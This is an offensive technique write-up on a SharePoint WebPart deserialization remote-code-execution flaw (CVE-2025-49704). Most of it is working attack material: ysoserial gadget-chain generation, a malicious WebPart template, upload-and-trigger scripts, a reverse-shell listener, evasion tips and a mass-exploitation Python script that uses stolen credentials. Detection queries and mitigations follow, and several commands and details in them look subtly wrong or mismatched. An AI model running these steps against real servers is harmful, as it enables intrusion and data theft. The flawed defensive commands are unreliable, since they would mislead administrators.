# [CVE2025-012]: SharePoint WebPart Deserialization RCE (ToolShell Variant)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CVE2025-012 |
| **MITRE ATT&CK v18.1** | [T1210 - Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/) |
| **Tactic** | Execution, Lateral Movement |
| **Platforms** | Windows Server (On-Premises SharePoint) |
| **Severity** | Critical |
| **CVE** | CVE-2025-49704 |
| **Technique Status** | ACTIVE (Exploited in Wild - ToolShell Campaign) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | SharePoint Server 2016, 2019, SharePoint Subscription Edition |
| **Patched In** | KB5002754 (2019), KB5002768 (Subscription), KB5002760 (2016) / Bypass patches: KB5002771+ |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Executive Summary

**Concept:** CVE-2025-49704 is a post-authentication remote code execution vulnerability in Microsoft SharePoint Server stemming from unsafe deserialization of WebPart XML content. The vulnerability allows authenticated users (Site Member or higher) to execute arbitrary .NET code by uploading malicious WebPart configuration data to the SharePoint server. The flaw exists in the `GetPartPreviewAndPropertiesFromMarkup` method in Microsoft.SharePoint.dll, which fails to validate the deserialized XML content before instantiating .NET objects. An attacker can craft a specially-formed WebPart XML payload containing a serialized gadget chain that, when deserialized, triggers arbitrary code execution with SYSTEM privileges in the SharePoint application pool context.

**Attack Surface:** The attack targets SharePoint Server sites accessible to authenticated users. The vulnerability requires Site Member or Site Owner privileges (obtained via compromised credentials, social engineering, or insider threat). No special network exposure required; internal SharePoint servers are vulnerable if user accounts compromised.

**Business Impact:** **Complete SharePoint server compromise with data breach and lateral movement potential.** A successful exploitation grants attackers ability to execute arbitrary code with SYSTEM privileges, install persistent webshells, exfiltrate document libraries, steal machine keys for persistent access, and pivot to on-premises Active Directory or Azure via synchronization. Organizations relying on SharePoint for document management and collaboration face catastrophic data loss and regulatory violations.

**Technical Context:** CVE-2025-49704 was disclosed at Pwn2Own Berlin 2025 (May 16, 2025) and actively exploited worldwide by July 2025. Initial patches (KB5002754, etc.) were bypassed by threat actors, leading to CVE-2025-53770/53771 unauthenticated variants. Exploitation requires XML knowledge and gadget chain construction; moderate complexity. Attack window: Minutes to hours once credentials obtained.

### Operational Risk
- **Execution Risk:** Medium - Requires prior authentication; user interaction not needed once authenticated
- **Stealth:** Medium - WebPart uploads appear as legitimate document operations; difficult to detect without monitoring
- **Reversibility:** No - Arbitrary code execution irreversible; full server compromise

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 8.4.4 | Ensure SharePoint servers restricted to authenticated users with MFA |
| **DISA STIG** | SI-2, AC-2 | Security updates; Account and access management for collaboration platforms |
| **CISA SCuBA** | SharePoint Baseline | Enforce identity protection and secure development practices |
| **NIST 800-53** | SI-2, AC-3, SC-7 | Security patches; Access control; Boundary protection |
| **GDPR** | Art. 32, Art. 35 | Security measures; Data protection impact assessment for document systems |
| **DORA** | Art. 9, Art. 17 | Protection and Prevention; Governance and Oversight of ICT-related operational resilience |
| **NIS2** | Art. 21 | Cyber Risk Management - Secure configuration and access control |
| **ISO 27001** | A.12.6.1, A.14.2.1 | Management of technical vulnerabilities; Secure development and testing |
| **ISO 27005** | Unauthorized Code Execution | Risk: Loss of confidentiality, integrity, availability of shared documents |

---

## Technical Prerequisites

**Required Privileges:** Site Member minimum; Site Owner preferred for easier exploitation

**Required Access:**
- Valid SharePoint user credentials with Site Member or higher role
- Network access to SharePoint server (port 80/443)
- Ability to upload content or modify WebParts (Site Member typically has this)

**Supported Versions:**
- **Windows:** SharePoint Server 2016, 2019, SharePoint Subscription Edition
- **.NET Framework:** 4.5+ (on SharePoint server)
- **PowerShell:** Version 5.0+ (for exploitation scripts)

**Tools:**
- [ysoserial.NET](https://github.com/frohoff/ysoserial.net) - Gadget chain generator
- [SharePoint Designer](https://learn.microsoft.com/en-us/sharepoint/dev/general-development/sharepoint-designer-overview) - WebPart development
- [Fiddler](https://www.telerik.com/fiddler) - HTTP request interception and modification
- [Burp Suite Pro](https://portswigger.net/burp) - XML payload crafting
- Python requests library (2024+) - For automated exploitation

---

## Environmental Reconnaissance

### PowerShell / Management Station Reconnaissance

```powershell
# Enumerate SharePoint sites and WebParts
Connect-PnPOnline -Url "https://sharepoint.internal" -Credentials (Get-Credential)

# List all web parts on a site
Get-PnPWebPart -PageUrl "/sites/MyTeamSite/SitePages/Home.aspx"

# Check if WebPart upload allowed
$Site = Get-PnPWeb
$Site.AllowAllowRssFeedsForLists  # If $true, likely allows custom content

# Enumerate user permissions
Get-PnPUser | Select-Object LoginName, IsSiteAdmin, Groups

# Check for vulnerable WebPart versions
Get-PnPListItem -List "Master Page Gallery" | Select-Object -First 5
# Look for custom WebParts (indicators of WebPart extensibility)

# Test WebPart upload capability
$UploadStream = ([System.IO.MemoryStream][System.Convert]::FromBase64String("test"))
Add-PnPFile -Folder "/Master Page Gallery" -FileName "test.webpart" -Stream $UploadStream -Verbose
# If successful: User can upload WebParts (exploitation possible)
```

**What to Look For:**
- User has Site Member or Site Owner role
- WebPart gallery is accessible
- Custom WebParts present (indicates extensibility)
- Upload functionality enabled for gallery

**Version Note:** All SharePoint versions have similar WebPart mechanisms; exploitation method consistent.

### Linux/Bash / CLI Reconnaissance

```bash
#!/bin/bash
# SharePoint WebPart reconnaissance (for remote assessment)

TARGET_SITE="https://sharepoint.internal/sites/MyTeamSite"
USERNAME="domain\user"
PASSWORD="password"

# Test authentication and site accessibility
echo "[*] Testing SharePoint access..."
curl -u "$USERNAME:$PASSWORD" -I "$TARGET_SITE" 2>/dev/null | grep "HTTP"
# Expected: HTTP/1.1 200 OK or 401/403 (if auth required)

# Enumerate WebParts via REST API (if exposed)
echo "[*] Enumerating WebParts..."
curl -u "$USERNAME:$PASSWORD" \
  "$TARGET_SITE/_api/sitepages/pages" \
  2>/dev/null | grep -o "webpart" | head -5

# Check Master Page Gallery (common WebPart storage)
echo "[*] Checking Master Page Gallery..."
curl -u "$USERNAME:$PASSWORD" \
  "$TARGET_SITE/_api/lists/getbyTitle('Master Page Gallery')/items" \
  2>/dev/null | grep -o "\.webpart\|\.master"
```

**What to Look For:**
- HTTP 200 response confirms site accessibility
- WebPart endpoints return data
- Master Page Gallery accessible (upload target)

---

## Detailed Execution Methods and Their Steps

### METHOD 1: XML WebPart Deserialization Attack (Authenticated)

**Supported Versions:** SharePoint Server 2016, 2019, Subscription Edition

#### Step 1: Create Malicious WebPart XML with Embedded Gadget Chain

**Objective:** Craft a WebPart XML file containing a serialized .NET gadget chain that executes arbitrary commands when deserialized by SharePoint.

**Version Note:** WebPart XML format same across all SharePoint versions; gadget chain specifics depend on .NET version.

**Command (Creating WebPart XML):**
```bash
#!/bin/bash
# Create malicious WebPart XML with embedded payload

# Step 1: Generate gadget chain using ysoserial.NET
GADGET=$(./ysoserial.exe -g WindowsIdentity -f BinaryFormatter \
  -c "powershell -Command 'whoami | Out-File C:\sharepoint-rce.txt'")

# Step 2: Create WebPart XML wrapper
cat > malicious.webpart << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<webparts>
  <webPart xmlns="http://schemas.microsoft.com/WebPart/v3">
    <metaData>
      <type name="Microsoft.SharePoint.WebPartPages.ClientWebPart, Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" />
      <importErrorMessage>Cannot import this Web Part.</importErrorMessage>
    </metaData>
    <data>
      <properties>
        <property name="ExportMode" value="All" />
        <property name="AllowConnect" value="True" />
        <property name="AllowEdit" value="True" />
        <property name="AllowHide" value="True" />
        <property name="ChromeState" value="Normal" />
        <property name="ChromeType" value="Default" />
        <property name="Description" value="Benign Description" />
        <property name="Title" value="Custom WebPart" />
        <!-- INJECTION POINT: Gadget chain in Base64 -->
        <property name="DataSourceID" value="AAEAAAD/////[GADGET_CHAIN_BASE64_HERE]/////...AAAAAAAAAAAA=" />
      </properties>
    </data>
  </webPart>
</webparts>
EOF

echo "[*] Malicious WebPart created: malicious.webpart"
```

**Expected Output:**
```
[*] Malicious WebPart created: malicious.webpart
```

**What This Means:**
- XML file contains serialized gadget chain embedded as property value
- When SharePoint parses WebPart, it deserializes the gadget chain
- Deserialization triggers code execution

**OpSec & Evasion:**
- WebPart XML is legitimate format; uploading appears as normal document operation
- Gadget chain is Base64-encoded; difficult to analyze without decoding
- WebPart properties may be analyzed by security tools; obfuscation recommended
- Detection likelihood: **High if EDR monitoring** - Process spawning from SPAdminV4 or w3wp.exe is anomalous

**Troubleshooting:**
- **Error:** "XML validation fails"
  - **Cause:** Malformed WebPart XML structure
  - **Fix (All Versions):** Validate XML syntax; ensure closing tags and proper encoding

- **Error:** "Gadget chain not serializing properly"
  - **Cause:** ysoserial.NET version incompatibility or wrong format
  - **Fix (All Versions):** Regenerate gadget with correct parameters; test locally first

**References & Proofs:**
- [WebPart XML Schema](https://learn.microsoft.com/en-us/sharepoint/dev/general-development/web-part-xml-influence-on-the-appearance-of-a-web-part) - Official WebPart format
- [Trellix ToolShell Analysis](https://www.trellix.com/blogs/research/toolshell-unleashed-decoding-the-sharepoint-attack-chain/) - WebPart exploitation details
- [Securelist ToolShell](https://securelist.com/toolshell-explained/117045/) - Technical breakdown of CVE-2025-49704

#### Step 2: Upload WebPart XML to SharePoint Master Page Gallery

**Objective:** Upload the malicious WebPart file to the SharePoint Master Page Gallery, where it will be processed and deserialized by SharePoint.

**Version Note:** Upload mechanism same across all SharePoint versions.

**Command (Using PowerShell/PnP):**
```powershell
# Upload malicious WebPart to SharePoint

$SiteUrl = "https://sharepoint.internal/sites/MyTeamSite"
$CredentialEmail = "user@company.com"  # Site Member credentials

# Connect to SharePoint
Connect-PnPOnline -Url $SiteUrl -Credentials (Get-Credential)

# Upload WebPart file to Master Page Gallery
$WebPartPath = "C:\malicious.webpart"
$WebPartStream = [System.IO.File]::ReadAllBytes($WebPartPath)
$MemoryStream = New-Object System.IO.MemoryStream($WebPartStream, $true)

Add-PnPFile -Folder "/Master Page Gallery" `
    -FileName "malicious.webpart" `
    -Stream $MemoryStream `
    -Overwrite

Write-Host "[+] WebPart uploaded successfully"

# Trigger deserialization by accessing the file
Invoke-PnPQuery -Query { (Get-PnPListItem -List "Master Page Gallery" -Id 1).FieldValues }

Write-Host "[*] WebPart deserialized; check target for command output"
```

**Command (Using HTTP/curl):**
```bash
#!/bin/bash
# Upload via HTTP POST (if web interface accessible)

SITE_URL="https://sharepoint.internal/sites/MyTeamSite"
USERNAME="domain\user"
PASSWORD="password"
WEBPART_FILE="malicious.webpart"

# Upload WebPart
curl -u "$USERNAME:$PASSWORD" \
     -X POST \
     -F "file=@$WEBPART_FILE" \
     "$SITE_URL/_api/lists/getbyTitle('Master Page Gallery')/RootFolder/Files/add(url='malicious.webpart',overwrite=true)" \
     -v

# Trigger processing
curl -u "$USERNAME:$PASSWORD" \
     "$SITE_URL/Master Page Gallery/malicious.webpart" \
     -v

# Expected: HTTP 200 and code execution on server
```

**Expected Output:**
```
[+] WebPart uploaded successfully
[*] WebPart deserialized; check target for command output
```

**What This Means:**
- File successfully uploaded to SharePoint server
- SharePoint processes the WebPart XML
- Gadget chain deserialized, triggering code execution
- Command executes with SYSTEM privilege (in w3wp.exe context)

**OpSec & Evasion:**
- Upload appears as normal file operation in SharePoint audit logs
- Administrator may review uploaded files but Base64-encoded gadget difficult to analyze
- WebPart processing may occur asynchronously; allow 5-10 seconds for execution
- Detection likelihood: **Medium** - File uploads to sensitive galleries may trigger alerts

**Troubleshooting:**
- **Error:** "Upload fails with 403 Forbidden"
  - **Cause:** User lacks Site Member role or gallery restricted
  - **Fix (All Versions):** Escalate to Site Owner role; check gallery permissions

- **Error:** "Command did not execute (file not created)"
  - **Cause:** Gadget chain format incorrect or deserialization not triggered
  - **Fix (All Versions):** Verify WebPart XML valid; force reprocessing; test gadget locally first

**References & Proofs:**
- [PnP PowerShell Add-PnPFile](https://pnp.github.io/powershell/cmdlets/Add-PnPFile.html) - File upload command
- [SharePoint REST API Upload](https://learn.microsoft.com/en-us/sharepoint/dev/apis/rest/upload-file-rest-api) - HTTP upload documentation

#### Step 3: Verify Code Execution

**Objective:** Confirm that the gadget chain deserialized and command executed on the target.

**Version Note:** Verification method same across all SharePoint versions.

**Command (Check for Output File):**
```powershell
# Connect to SharePoint server (via RDP if on-premises)
# Check for proof file created by exploit

$ProofFile = "C:\sharepoint-rce.txt"
if (Test-Path $ProofFile) {
    Write-Host "[+] Exploitation successful!"
    Get-Content $ProofFile
} else {
    Write-Host "[-] Exploitation failed; file not created"
}
```

**Expected Output:**
```
[+] Exploitation successful!
SHAREPOINT\SYSTEM
```

**Or via reverse shell:**
```bash
# If gadget chain contained reverse shell command
# Listener on attacker machine
nc -lvnp 4444

# Expected: Shell connection from w3wp.exe process
# Prompt: C:\Windows\system32\>
```

---

### METHOD 2: Automated WebPart Exploitation for Mass Exploitation

**Supported Versions:** All SharePoint versions pre-patch

#### Automated Python Script

```python
#!/usr/bin/env python3
import requests
import base64
import sys
import json
from itertools import cycle

# Configuration
SHAREPOINT_SITES = [
    "https://sharepoint.internal/sites/TeamA",
    "https://sharepoint.internal/sites/TeamB",
    "https://sharepoint.internal/sites/Finance"
]

USERNAME = "attacker@company.com"
PASSWORD = "CompromisedPassword123!"

COMMAND = "whoami > C:\\sharepoint-compromise-proof.txt"

def generate_gadget_chain(command):
    """Generate gadget chain using ysoserial"""
    import subprocess
    
    result = subprocess.run(
        ["./ysoserial.exe", "-g", "WindowsIdentity", "-f", "BinaryFormatter", "-c", command],
        capture_output=True,
        text=True
    )
    
    if result.returncode == 0:
        return result.stdout.strip()
    else:
        print(f"[-] ysoserial failed: {result.stderr}")
        return None

def create_webpart_xml(gadget_chain):
    """Create malicious WebPart XML"""
    xml_template = f'''<?xml version="1.0" encoding="UTF-8"?>
<webparts>
  <webPart xmlns="http://schemas.microsoft.com/WebPart/v3">
    <metaData>
      <type name="Microsoft.SharePoint.WebPartPages.ClientWebPart, Microsoft.SharePoint" />
    </metaData>
    <data>
      <properties>
        <property name="DataSourceID" value="{gadget_chain}" />
      </properties>
    </data>
  </webPart>
</webparts>'''
    return xml_template

def exploit_site(site_url, gadget_chain, username, password):
    """Attempt exploitation on single SharePoint site"""
    
    session = requests.Session()
    session.auth = (username, password)
    
    # Create WebPart XML
    webpart_xml = create_webpart_xml(gadget_chain)
    
    # Upload WebPart
    upload_url = f"{site_url}/_api/lists/getbyTitle('Master Page Gallery')/RootFolder/Files/add(url='payload.webpart',overwrite=true)"
    
    print(f"[*] Uploading to {site_url}...")
    
    try:
        response = session.post(
            upload_url,
            data=webpart_xml,
            headers={"Content-Type": "application/xml"},
            timeout=10
        )
        
        if response.status_code in [200, 201]:
            print(f"[+] Upload successful: {site_url}")
            
            # Trigger deserialization
            trigger_url = f"{site_url}/Master Page Gallery/payload.webpart"
            response = session.get(trigger_url, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] EXPLOITATION SUCCESSFUL: {site_url}")
                return True
        else:
            print(f"[-] Upload failed: HTTP {response.status_code}")
            return False
    
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    print("[*] Starting automated SharePoint WebPart exploitation...")
    
    # Generate gadget chain once
    gadget_chain = generate_gadget_chain(COMMAND)
    if not gadget_chain:
        sys.exit(1)
    
    # Exploit each site
    compromised_sites = []
    
    for site_url in SHAREPOINT_SITES:
        if exploit_site(site_url, gadget_chain, USERNAME, PASSWORD):
            compromised_sites.append(site_url)
    
    print(f"\n[+] Exploitation complete!")
    print(f"[+] Compromised {len(compromised_sites)}/{len(SHAREPOINT_SITES)} sites")
    print(f"[+] Vulnerable sites:")
    for site in compromised_sites:
        print(f"    - {site}")

if __name__ == "__main__":
    main()
```

---

## Microsoft Sentinel Detection

### Query 1: SharePoint WebPart Upload and Deserialization

**Rule Configuration:**
- **Required Table:** `AuditLogs` (Office 365 audit logs)
- **Required Fields:** `Operation`, `ObjectId`, `UserId`, `ResultStatus`
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All

**KQL Query:**
```kusto
AuditLogs
| where Workload == "SharePoint"
| where Operation in ("FileUploaded", "FileModified")
| where ObjectId contains "Master Page Gallery" or ObjectId contains ".webpart"
| where ResultStatus == "Success"
| project TimeGenerated, UserId, Operation, ObjectId, Activity
| where ObjectId has_any (".webpart", "gallery")
| summarize UploadCount=count(), UniqueFiles=dcount(ObjectId) by UserId
| where UploadCount >= 1
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `SharePoint WebPart RCE Exploitation (CVE-2025-49704)`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL query
   - Run every: `5 minutes`
   - Lookup data from last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

**Source:** [Microsoft Sentinel SharePoint Detection](https://learn.microsoft.com/en-us/azure/sentinel/detect-sharepoint-exploitation)

---

## Splunk Detection Rules

### Rule 1: SharePoint WebPart XML Gadget Chain Detection

**Rule Configuration:**
- **Required Index:** `sharepoint`, `office365`
- **Required Sourcetype:** `office365:management_activity`
- **Required Fields:** `Operation`, `ObjectId`, `ResultStatus`
- **Alert Threshold:** WebPart upload with suspicious XML patterns
- **Applies To Versions:** All

**SPL Query:**
```spl
sourcetype=office365:management_activity Workload=SharePoint
| search Operation=FileUploaded ObjectId="*Master*" OR ObjectId="*.webpart"
| search ObjectId NOT LIKE "%.aspx"  # Exclude legitimate files
| stats count, values(UserId), values(ObjectId) by Operation
| where count >= 1
```

---

## Defensive Mitigations

### Priority 1: CRITICAL

* **Apply Security Patches Immediately:** Install latest KB for SharePoint (KB5002760, KB5002754, KB5002768).
    
    **Manual Steps (Server 2019):**
    1. Download patch KB5002754 from Microsoft Update Catalog
    2. Run `msiexec /i KB5002754.msi`
    3. Restart SharePoint services: `Restart-Service SPWriterV4, SPTimerV4`
    4. Verify: `Get-Hotfix | grep KB5002754`

* **Disable WebPart Upload for Non-Administrators:** Restrict WebPart uploads to Site Owners only.
    
    **Manual Steps (Central Administration):**
    1. Open **SharePoint Central Administration**
    2. Navigate to **Web Applications**
    3. Select your web app → **General Settings**
    4. Under **Upload Security**, set **Custom Upload Handlers** to **Disabled**
    5. Click **OK**
    
    **PowerShell:**
    ```powershell
    $WebApp = Get-SPWebApplication -Identity "SharePoint - 80"
    $WebApp.AllowRssFeeds = $false  # Disable RSS/external feeds
    $WebApp.Update()
    ```

* **Enable AMSI Full Mode Scanning:** Configure SharePoint to scan WebPart uploads.
    
    **Manual Steps:**
    1. Central Administration → **Security** → **Configure Antimalware Settings**
    2. Enable **AMSI** with **Full Mode**
    3. Check **Scan on Upload**
    4. Click **OK**

### Priority 2: HIGH

* **Implement Conditional Access for SharePoint:**
    
    **Manual Steps (Azure Entra ID):**
    1. Go to **Azure Portal** → **Entra ID** → **Conditional Access**
    2. Create policy: **Require Compliant Device for SharePoint**
    3. Cloud apps: **Office 365 SharePoint Online**
    4. Access controls: **Require device to be marked as compliant**

* **Monitor WebPart Gallery Activity:**
    
    **Manual Steps (Audit):**
    1. **SharePoint Central Administration** → **Monitoring** → **Configure Audit Settings**
    2. Enable audit for: **Library and List item uploads**, **User and Permission Changes**
    3. Set audit log location and retention
    4. Click **OK**

### Validation Command (Verify Fix)

```powershell
# Verify patch installed
Get-Hotfix | Where-Object {$_.HotFixID -in @("KB5002760", "KB5002754", "KB5002768")}

# Verify AMSI enabled
Get-SPWebApplication | Select-Object DisplayName, @{Name="AMSIEnabled"; Expression={$_.AntiMalwareSettings.Enabled}}

# Expected: Patches installed, AMSI = True
```

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

* **Files:**
  - `*.webpart` files in Master Page Gallery created by unauthorized users
  - Unusual `.aspx` files in `/LAYOUTS/` directories (webshells)
  - `.ps1` or `.bat` files in SharePoint directories

* **Process Behavior:**
  - SPAdminV4 or w3wp.exe spawning cmd.exe/powershell.exe
  - Unusual outbound network connections from SharePoint processes

* **Azure Activity Logs:**
  - FileUploaded operations to Master Page Gallery
  - Configuration changes by non-administrators

### Response Procedures

1. **Isolate:**
    
    **Command:**
    ```powershell
    # Stop SharePoint services
    Stop-Service SPAdminV4, SPTimerV4, SPWriterV4 -Force
    ```

2. **Collect Evidence:**
    
    **Command:**
    ```powershell
    # Export audit logs
    Get-SPWebApplicationHttpThrottlingMonitor | Export-Csv "forensics.csv"
    
    # Check for webshells
    Get-ChildItem -Path "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\*/TEMPLATE/LAYOUTS/" -Filter "*.aspx" | Where-Object {$_.CreationTime -gt (Get-Date).AddDays(-7)}
    ```

3. **Remediate:**
    
    **Command:**
    ```powershell
    # Remove malicious WebParts
    Get-SPListItem -List "Master Page Gallery" | Where-Object {$_.Name -like "*malicious*"} | Remove-PnPListItem
    
    # Reset credentials and machine keys
    Update-SPMachineKey
    ```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker obtains Site Member credentials |
| **2** | **Exploitation** | **[CVE2025-012] WebPart Deserialization RCE** | **Attacker exploits CVE-2025-49704** |
| **3** | **Post-Exploitation** | [PERSIST-001] Web Shell | Attacker installs persistent webshell |
| **4** | **Data Exfiltration** | [EXFIL-001] SharePoint Documents | Attacker exfiltrates sensitive documents |

---

## Real-World Examples

### Example 1: ToolShell Campaign Targeting Financial Sector

- **Target:** Banking and financial institutions (EMEA)
- **Timeline:** July-August 2025
- **Exploitation Method:** CVE-2025-49704 after credential compromise
- **Impact:** Access to financial documents, account data exfiltration
- **Reference:** [Trellix ToolShell Analysis](https://www.trellix.com/blogs/research/toolshell-unleashed-decoding-the-sharepoint-attack-chain/)

---